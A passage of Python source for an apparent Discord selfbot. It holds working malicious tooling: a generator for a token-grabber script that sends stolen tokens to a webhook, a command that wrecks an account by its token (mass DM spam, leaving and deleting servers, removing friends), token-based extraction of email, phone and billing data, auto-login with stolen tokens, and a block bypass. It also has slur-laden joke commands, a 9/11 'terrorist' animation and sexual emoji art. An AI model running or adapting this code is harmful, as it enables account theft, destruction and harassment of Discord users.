                    "icon_url": avatar_url
                },
                "footer": {
                
                }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Discord Token Grabber",
        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
    }
    try:
        urlopen(Request("~~TOKENURLHERE~~", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass

main()""".replace("~~TOKENURLHERE~~", webhook))
        await ctx.send(file=discord.File("printer.py"))
        os.remove(f"printer.py")

    except Exception as e:
        await ctx.send(f"[ERROR]: {e}")

#Destroy a Account with his token
@Astraa.command(aliases=['tokenfucker', 'disable', 'crash'])
async def tokenfuck(ctx, usertoken=None):
    await ctx.message.delete()
    if usertoken is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}tokenfuck <token>')
        return
    headers = {'Authorization': usertoken}
    setting = {
          'theme': "light",
          'locale': "ja",
          'message_display_compact': False,
          'inline_embed_media': False,
          'inline_attachment_media': False,
          'gif_auto_play': False,
          'render_embeds': False,
          'render_reactions': False,
          'animate_emoji': False,
          'convert_emoticons': False,
          'enable_tts_command': False,
          'explicit_content_filter': '0',
          'status': "idle"
    }
    requests.patch("https://discord.com/api/v7/users/@me/settings", headers={'Authorization': usertoken}, json=setting)

    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers={'Authorization': usertoken}).json()
    for channel in channelIds:
        try:
            requests.post(f'https://discord.com/api/v9/channels/' + channel['id'] + '/messages', headers=headers, data={"content": f":clown:"})
        except Exception as e:
            print(f"\n{y}[{Fore.LIGHTRED_EX }!{y}]{w} The following error has been encountered and is being ignored: {e}")

    guildsIds = requests.get("https://discord.com/api/v7/users/@me/guilds", headers={'Authorization': usertoken}).json()
    for guild in guildsIds:
        try:
            requests.delete(f'https://discord.com/api/v7/users/@me/guilds/' + guild['id'], headers={'Authorization': usertoken})
            print(f"\n{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} Left guild: " + guild['name'])
        except Exception as e:
            print(f"\t{y}[{Fore.LIGHTRED_EX }!{y}]{w} The following error has been encountered and is being ignored: {e}")

    for guild in guildsIds:
        try:
            requests.delete(f'https://discord.com/api/v7/guilds/' + guild['id'], headers={'Authorization': usertoken})
        except Exception as e:
            print(f"\n{y}[{Fore.LIGHTRED_EX }!{y}]{w} The following error has been encountered and is being ignored: {e}")

    friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers={'Authorization': usertoken}).json()
    for friend in friendIds:
        try:
            requests.delete(f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], headers={'Authorization': usertoken})
        except Exception as e:
            print(f"\n{y}[{Fore.LIGHTRED_EX }!{y}]{w} The following error has been encountered and is being ignored: {e}")

    for i in range(100):
        try:
            payload = {'name': f'sry <3', 'region': 'europe', 'icon': None, 'channels': None}
            requests.post('https://discord.com/api/v7/guilds', headers={'Authorization': usertoken}, json=payload)
        except Exception as e:
            print(f"\n{y}[{Fore.LIGHTRED_EX }!{y}]{w} The following error has been encountered and is being ignored: {e}")
    
    j = requests.get("https://discordapp.com/api/v9/users/@me", headers={'Authorization': usertoken}).json()

    a = j['username'] + "#" + j['discriminator']
    await ctx.send(f"Succesfully turned **{a}**'s account into a holl")

#Scrape info with a token
@Astraa.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, usertoken=None):
    await ctx.message.delete()
    if usertoken is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}tokeninfo <token>')
        return
    headers = {
        'Authorization': usertoken,
        'Content-Type': 'application/json'
    }

    languages = {
    'da'    : 'Danish, Denmark',
    'de'    : 'German, Germany',
    'en-GB' : 'English, United Kingdom',
    'en-US' : 'English, United States',
    'es-ES' : 'Spanish, Spain',
    'fr'    : 'French, France',
    'hr'    : 'Croatian, Croatia',
    'lt'    : 'Lithuanian, Lithuania',
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
    }

    try:
        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
    except:
        await ctx.send(f"[ERROR]: An error occurred while sending request")

    if res.status_code == 200:
        res_json = res.json()
        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
        user_id = res_json['id']
        avatar_id = res_json['avatar']
        avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'
        phone_number = res_json['phone']
        email = res_json['email']
        mfa_enabled = res_json['mfa_enabled']
        flags = res_json['flags']
        locale = res_json['locale']
        verified = res_json['verified']
        days_left = ""
        language = languages.get(locale)
        from datetime import datetime
        creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
        has_nitro = False
        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
        nitro_data = res.json()
        has_nitro = bool(len(nitro_data) > 0)

        if has_nitro:
            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            days_left = abs((d2 - d1).days)

        try:
            embed = f"""**TOKEN INFORMATIONS | Prefix: `{Astraa.command_prefix}`**\n
> :dividers: __Basic Information__\n\tUsername: `{user_name}`\n\tUser ID: `{user_id}`\n\tCreation Date: `{creation_date}`\n\tAvatar URL: `{avatar_url if avatar_id else "None"}`
> :crystal_ball: __Nitro Information__\n\tNitro Status: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`
> :incoming_envelope: __Contact Information__\n\tPhone Number: `{phone_number if phone_number else "None"}`\n\tEmail: `{email if email else "None"}`
> :shield: __Account Security__\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tFlags: `{flags}`
> :paperclip: __Other__\n\tLocale: `{locale} ({language})`\n\tEmail Verified: `{verified}`"""
            await ctx.send(embed, file=discord.File("Images/astraa.gif"))
        except Exception as e:
            await ctx.send(e)

    elif res.status_code == 401:
        await ctx.send(f"[ERROR]: Invalid token")
    else:
        await ctx.send(f"[ERROR]: An error occurred while sending request")

#Log in to the account automatically
@Astraa.command(aliases=["log", "login"])
async def autolog(ctx, token=None):
    await ctx.message.delete()
    if token is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}autolog <token>')
        return
    from selenium import webdriver
    try:
        driver = webdriver.Chrome(executable_path=r'chromedriver.exe')
        driver.maximize_window()
        driver.get('https://discord.com/login')
        js = 'function login(token) {setInterval(() => {document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`}, 50);setTimeout(() => {location.reload();}, 500);}'
        time.sleep(3)
        driver.execute_script(js + f'login("{token}")')
        time.sleep(10)
        if driver.current_url == 'https://discord.com/login':
            print(f"\n{y}[{Fore.LIGHTRED_EX }!{y}]{w} Connection Failed""")
            return
        else:
            print(f"\n{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} Connection Established""")
    except:
        print(f"\n{y}[{Fore.LIGHTRED_EX }!{y}]{w} There is a problem with your Token")

#Delete all dm with a user
@Astraa.command()
async def cleardm(ctx, limit: int=None):
    await ctx.message.delete()
    passed = 0
    failed = 0
    async for msg in ctx.message.channel.history(limit=limit):
        if msg.author.id == Astraa.user.id:
            try:
                await msg.delete()
                passed += 1
            except:
                failed += 1
    print(f"{y}[{Fore.GREEN}!{y}]{w} Removed {passed} messages with {failed} fails")

#Change your hypesquad badge
@Astraa.command()
async def hypesquad(ctx, house=None):
    await ctx.message.delete()
    if house is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}hypesquad <house>')
        return
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:
      headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
        }
      if house == "Bravery":
          payload = {'house_id': 1}
      elif house == "Brilliance":
          payload = {'house_id': 2}
      elif house == "Balance":
          payload = {'house_id': 3}
      else:
            await ctx.send(f'[ERROR]: Invalid input! Hypesquad house must be one of the following: `Bravery`, `Brilliance`, `Balance`')
            return
      r = requests.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
      if r.status_code == 204:
        await ctx.send(f'Hypesquad House changed to **{house}**!')

#Get all infos about a discord server
@Astraa.command(aliases=["guildinfo"])
async def serverinfo(ctx):
    await ctx.message.delete()
    date_format = "%a, %d %b %Y %I:%M %p"
    embed = f"""**SERVER INFORMATIONS | Prefix: `{Astraa.command_prefix}`**\n
> :dividers: __Basic Information__\n\tServer Name: `{ctx.guild.name}`\n\tServer ID: `{ctx.guild.id}`\n\tCreation Date: `{ctx.guild.created_at.strftime(date_format)}`\n\tServer Icon: `{ctx.guild.icon_url if ctx.guild.icon_url else "None"} `\n\tServer Owner: `{ctx.guild.owner}`\n\tServer Region: `{ctx.guild.region}`
> :page_facing_up: __Others Information__\n\t`{len(ctx.guild.members)}` Members\n\t`{len(ctx.guild.roles)}` Roles\n\t`{len(ctx.guild.text_channels) if ctx.guild.text_channels else "None"}` Text-Channels\n\t`{len(ctx.guild.voice_channels) if ctx.guild.voice_channels else "None"}` Voice-Channels\n\t`{len(ctx.guild.categories) if ctx.guild.categories else "None"}` Categories"""
    await ctx.send(embed, file=discord.File("Images/astraa.gif"))

#Generate a random nitro code
@Astraa.command(aliases=["nitrogen"])
async def nitro(ctx):
    await ctx.message.delete()
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    await ctx.send(f'https://discord.gift/{code}')

#Delete the selected webhook
@Astraa.command(aliases=["whremove", "whdel", "whd"])
async def webhookremove(ctx, webhook=None):
    await ctx.message.delete()
    if webhook is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}webhookremove <webhook>')
        return
    requests.delete(webhook.rstrip())
    await ctx.send(f'Webhook has been deleted!')


#Exploit commands
#Hide messages inside other messages
@Astraa.command()
async def hide(ctx, display=None, hidden=None):
    await ctx.message.delete()
    if display is None and hidden is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}hide <display> <hidden>')
        return
    await ctx.send(display + ('||\u200b||' * 200) + hidden)

#Move the position of the (edited) tag
@Astraa.command()
async def edit(ctx, message=None):
    await ctx.message.delete()
    if message is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}edited <message>')
        return
    text = await ctx.send(f'{message}')
    await text.edit(content=f"\u202b{message}")

#Message Discord users you have blocked
@Astraa.command(aliases=["blockbp", "bpblock", "bpb"])
async def bypassblock(ctx, userid=None):
    if userid is None:
            await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}bypassblock <userid> <message>')
            return
    try:
        headers = {'Authorization': token}
        res = requests.post('https://discordapp.com/api/v6/users/@me/channels', headers=headers, json={'recipient_id': userid})
        channel_id = res.json().get('id')
        await ctx.message.edit(content=f"Message to send:", delete_after=10)
        Astraa.blockbypass = channel_id
    except Exception as e:
        await ctx.send(f'[ERROR]: {e}')


#Fun commands
#Send a random gif
@Astraa.command(aliases=["giphy", "tenor", "searchgif"])
async def gif(ctx, query=None):
    await ctx.message.delete()
    if query is None:
        r = requests.get("https://api.giphy.com/v1/gifs/random?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&tag=&rating=R")
        res = r.json()
        await ctx.send(res['data']['url'])
    else:
        r = requests.get(f"https://api.giphy.com/v1/gifs/search?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&q={query}&limit=1&offset=0&rating=R&lang=en")
        res = r.json()
        await ctx.send(res['data'][0]["url"])

#Send a random image
@Astraa.command(aliases=["img", "searchimg", "searchimage", "imagesearch", "imgsearch"])
async def image(ctx, *, args):
    await ctx.message.delete()
    url = 'https://unsplash.com/search/photos/' + args.replace(" ", "%20")
    page = requests.get(url)
    soup = bs4(page.text, 'html.parser')
    image_tags = soup.findAll('img')
    if str(image_tags[2]['src']).find("https://trkn.us/pixel/imp/c="):
        link = image_tags[2]['src']
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(link) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(f"Search result for: **{args}**", file=discord.File(file, f"astraa_image.png"))
        except:
            await ctx.send(f"Search result for: **{args}**\n{link}")
    else:
        await ctx.send("Nothing found for **" + args + "**")

#9/11 animation
@Astraa.command(aliases=["9/11", "911", "terrorist"])
async def nine_eleven(ctx):
    await ctx.message.delete()
    invis = ""  # char(173)
    message = await ctx.send(f'''
{invis}:man_wearing_turban::airplane:    :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis} :man_wearing_turban::airplane:   :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}  :man_wearing_turban::airplane:  :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}   :man_wearing_turban::airplane: :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}    :man_wearing_turban::airplane::office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
        :boom::boom::boom:    
        ''')

#Cum animation
@Astraa.command(aliases=["jerkoff", "ejaculate", "orgasm"])
async def cum(ctx):
    await ctx.message.delete()
    message = await ctx.send('''
            :ok_hand:            :smile:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :smiley:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :grimacing:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :persevere:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:   
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :confounded:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant: 
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :tired_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:    
             ''')
    await asyncio.sleep(0.5)
    await message.edit(contnet='''
                       :ok_hand:            :weary:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:= D:sweat_drops:
             :trumpet:      :eggplant:        
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :dizzy_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :drooling_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')

#Make a Fake Tweet
@Astraa.command()
async def tweet(ctx, username: str = None, *, message: str = None):
    await ctx.message.delete()
    if username is None or message is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}tweet <username> <message>')
        return
    async with aiohttp.ClientSession() as cs:
        async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
            res = await r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(str(res['message'])) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"astraa_tweet.png"))
            except:
                await ctx.send(res['message'])

#Distort image
@Astraa.command(aliases=["distort"])
async def magik(ctx, user: discord.Member=None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=magik&intensity=3&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"astraa_magik.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"astraa_magik.png"))
        except:
            await ctx.send(res['message'])

#Deepfry image
@Astraa.command(aliases=["deepfry"])
async def fry(ctx, user: discord.Member=None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=deepfry&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"astraa_fry.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"astraa_fry.png"))
        except:
            await ctx.send(res['message'])

#Blurp image
@Astraa.command(aliases=["blurp"])
async def blurpify(ctx, user: discord.Member=None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=blurpify&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"astraa_blurpify.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"astraa_blurpify.png"))
        except:
            await ctx.send(res['message'])

#Make a Fake pornhub comment
@Astraa.command(aliases=["pornhubcomment", 'phc'])
async def phcomment(ctx, user: str = None, *, args=None):
    await ctx.message.delete()
    if user is None or args is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}phcomment <message>')
        return
    endpoint = "https://nekobot.xyz/api/imagegen?type=phcomment&text=" + args + "&username=" + user + "&image=" + str(
        ctx.author.avatar_url_as(format="png"))
    r = requests.get(endpoint)
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res["message"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"astraa_pornhub_comment.png"))
    except:
        await ctx.send(res["message"])

#Pretend to hack a user
@Astraa.command()
async def hack(ctx, user: discord.Member=None):
    await ctx.message.delete()
    gender = ["Male", "Female", "Trans", "Other", "Retard"]
    age = str(random.randrange(10, 25))
    height = ['4\'6\"', '4\'7\"', '4\'8\"', '4\'9\"', '4\'10\"', '4\'11\"', '5\'0\"', '5\'1\"', '5\'2\"', '5\'3\"',
              '5\'4\"', '5\'5\"',
              '5\'6\"', '5\'7\"', '5\'8\"', '5\'9\"', '5\'10\"', '5\'11\"', '6\'0\"', '6\'1\"', '6\'2\"', '6\'3\"',
              '6\'4\"', '6\'5\"',
              '6\'6\"', '6\'7\"', '6\'8\"', '6\'9\"', '6\'10\"', '6\'11\"']
    weight = str(random.randrange(60, 300))
    hair_color = ["Black", "Brown", "Blonde", "White", "Gray", "Red"]
    skin_color = ["White", "Pale", "Brown", "Black", "Light-Skin"]
    religion = ["Christian", "Muslim", "Atheist", "Hindu", "Buddhist", "Jewish"]
    sexuality = ["Straight", "Gay", "Homo", "Bi", "Bi-Sexual", "Lesbian", "Pansexual"]
    education = ["High School", "College", "Middle School", "Elementary School", "Pre School",
                 "Retard never went to school LOL"]
    ethnicity = ["White", "African American", "Asian", "Latino", "Latina", "American", "Mexican", "Korean", "Chinese",
                 "Arab", "Italian", "Puerto Rican", "Non-Hispanic", "Russian", "Canadian", "European", "Indian"]
    occupation = ["Retard has no job LOL", "Certified discord retard", "Janitor", "Police Officer", "Teacher",
                  "Cashier", "Clerk", "Waiter", "Waitress", "Grocery Bagger", "Retailer", "Sales-Person", "Artist",
                  "Singer", "Rapper", "Trapper", "Discord Thug", "Gangster", "Discord Packer", "Mechanic", "Carpenter",
                  "Electrician", "Lawyer", "Doctor", "Programmer", "Software Engineer", "Scientist"]
    salary = ["Retard makes no money LOL", "$" + str(random.randrange(0, 1000)), '<$50,000', '<$75,000', "$100,000",
              "$125,000", "$150,000", "$175,000",
              "$200,000+"]
    location = ["Retard lives in his mom's basement LOL", "America", "United States", "Europe", "Poland", "Mexico",
                "Russia", "Pakistan", "India",
                "Some random third world country", "Canada", "Alabama", "Alaska", "Arizona", "Arkansas", "California",
                "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana",
                "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan",
                "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey",
                "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon",
                "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah",
                "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"]
    email = ["@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com", "@protonmail.com", "@disposablemail.com",
             "@aol.com", "@edu.com", "@icloud.com", "@gmx.net", "@yandex.com"]
    dob = f'{random.randrange(1, 13)}/{random.randrange(1, 32)}/{random.randrange(1950, 2021)}'
    name = ['James Smith', "Michael Smith", "Robert Smith", "Maria Garcia", "David Smith", "Maria Rodriguez",
            "Mary Smith", "Maria Hernandez", "Maria Martinez", "James Johnson", "Catherine Smoaks", "Cindi Emerick",
            "Trudie Peasley", "Josie Dowler", "Jefferey Amon", "Kyung Kernan", "Lola Barreiro",
            "Barabara Nuss", "Lien Barmore", "Donnell Kuhlmann", "Geoffrey Torre", "Allan Craft",
            "Elvira Lucien", "Jeanelle Orem", "Shantelle Lige", "Chassidy Reinhardt", "Adam Delange",
            "Anabel Rini", "Delbert Kruse", "Celeste Baumeister", "Jon Flanary", "Danette Uhler", "Xochitl Parton",
            "Derek Hetrick", "Chasity Hedge", "Antonia Gonsoulin", "Tod Kinkead", "Chastity Lazar", "Jazmin Aumick",
            "Janet Slusser", "Junita Cagle", "Stepanie Blandford", "Lang Schaff", "Kaila Bier", "Ezra Battey",
            "Bart Maddux", "Shiloh Raulston", "Carrie Kimber", "Zack Polite", "Marni Larson", "Justa Spear"]
    phone = f'({random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)})-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}'
    if user is None:
        user = ctx.author
        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")
    else:
        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")

#Make a minesweeper game
@Astraa.command()
async def minesweeper(ctx, size: int=5):
    await ctx.message.delete()
    size = max(min(size, 8), 2)
    bombs = [[random.randint(0, size - 1), random.randint(0, size - 1)] for x in range(int(size - 1))]
    is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
    has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]
    message = "**Click to play**:\n"
    for y in range(size):
        for x in range(size):
            tile = "||{}||".format(chr(11036))
            if has_bomb(x, y):
                tile = "||{}||".format(chr(128163))
            else:
                count = 0
                for xmod, ymod in m_offets:
                    if is_on_board(x + xmod, y + ymod) and has_bomb(x + xmod, y + ymod):
                        count += 1
                if count != 0:
                    tile = "||{}||".format(m_numbers[count - 1])
            message += tile
        message += "\n"
    await ctx.send(message)

#Trandform your message into 1337speak
@Astraa.command(name='1337speak', aliases=['leetspeak'])
async def _1337_speak(ctx, *, text=None):
    await ctx.message.delete()
    if text is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}1337speak <text>')
        return
    text = text.replace('a', '4').replace('A', '4').replace('e', '3') \
        .replace('E', '3').replace('i', '!').replace('I', '!') \
        .replace('o', '0').replace('O', '0').replace('u', '|_|').replace('U', '|_|')
    await ctx.send(f'{text}')

#Have your friends vote by generating a random question
@Astraa.command(aliases=['wouldyourather', 'would-you-rather', 'wyrq'])
async def wyr(ctx):
    await ctx.message.delete()
